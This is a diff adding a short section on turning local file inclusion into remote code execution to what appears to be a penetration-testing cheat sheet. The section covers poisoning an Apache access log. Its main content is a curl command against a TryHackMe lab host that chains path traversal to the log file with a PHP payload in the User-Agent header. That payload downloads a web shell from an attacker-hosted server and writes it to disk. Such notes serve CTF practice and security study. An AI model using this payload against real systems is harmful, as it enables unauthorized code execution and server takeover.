@@ -369,6 +369,31 @@ References:
 
 ----------------------------
 
+### LFI2RCE with apache2 server's log
+
+- Log location-:`/var/log/apache2/access.log`
+- Host a command shell php code with python's http.server
+
+  ![image](https://github.com/user-attachments/assets/e2e7c58f-4e52-44bc-aaa5-1c3f2cec9e49)
+
+- RCE:
+  - Exploit HTTP-Header `User-Agent`
+    e.g
+
+         curl http://mafialive.thm/test.php\?view\=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<http server's ip>:<http server'sport>/shell.php')) ?>"
+  - Reload the log file to execute code
+  - Sometimes you need to set the file path of shell.php to a path with write permissions
+
+ ----------------------------
+ 
+ ### REFERNCES:
+
+ - [Roquenight](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
+   
+ ---------------------------------
+    
+    
+
 
 
 
